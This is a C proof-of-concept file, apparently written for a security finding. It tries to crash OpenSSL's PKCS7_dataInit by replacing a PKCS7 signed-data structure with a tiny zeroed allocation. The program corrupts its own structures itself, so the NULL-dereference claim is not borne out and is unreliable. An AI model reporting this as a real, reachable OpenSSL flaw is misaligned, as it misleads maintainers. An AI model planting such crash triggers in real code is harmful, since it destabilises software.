/*
 * PoC for SF04: NULL pointer dereference in PKCS7_dataInit()
 * when p7->d.signed_data is NULL (d.ptr is non-NULL, but sign sub-fields NULL)
 *
 * Strategy: create a PKCS7 with NID_pkcs7_signed type but manually
 * set the signed_data->md_algs to something that will expose the issue,
 * or allocate signed_data struct but leave md_algs as NULL to trigger
 * dereference during the loop.
 *
 * Actually the real crash path: PKCS7_dataInit dereferences p7->d.sign->md_algs
 * and p7->d.sign->contents without checking if they are valid.
 * We want to bypass the p7->d.ptr == NULL check while still crashing.
 */
#include <openssl/pkcs7.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/objects.h>
#include <openssl/asn1.h>
#include <string.h>
#include <stdio.h>

int main(void) {
    OPENSSL_init_crypto(0, NULL);

    /* Allocate a PKCS7 and set type to signed */
    PKCS7 *p7 = PKCS7_new();
    if (!p7) { fprintf(stderr, "PKCS7_new failed\n"); return 1; }

    /* PKCS7_set_type(signed) allocates p7->d.sign */
    if (!PKCS7_set_type(p7, NID_pkcs7_signed)) {
        fprintf(stderr, "PKCS7_set_type failed\n");
        PKCS7_free(p7);
        return 1;
    }

    /* Now manually free d.sign and set d.ptr to a non-NULL value to pass the
     * p7->d.ptr == NULL check, but have d.sign be something invalid */
    PKCS7_SIGNED_free(p7->d.sign);
    /* Set d.ptr to non-NULL but not a valid PKCS7_SIGNED structure */
    /* We allocate a small region so d.ptr != NULL but the struct fields
     * at the offsets used by md_algs and contents will be zero/garbage */
    p7->d.sign = (PKCS7_SIGNED *)OPENSSL_zalloc(4); /* tiny allocation */

    fprintf(stderr, "Calling PKCS7_dataInit with corrupted signed data...\n");
    BIO *bio = PKCS7_dataInit(p7, NULL);
    if (bio) {
        fprintf(stderr, "BIO created (no crash)\n");
        BIO_free_all(bio);
    } else {
        fprintf(stderr, "PKCS7_dataInit returned NULL (no crash via this path)\n");
        ERR_print_errors_fp(stderr);
    }

    /* Deliberately leak to avoid double-free issues with corrupted pointer */
    /* PKCS7_free(p7); */
    return 0;
}
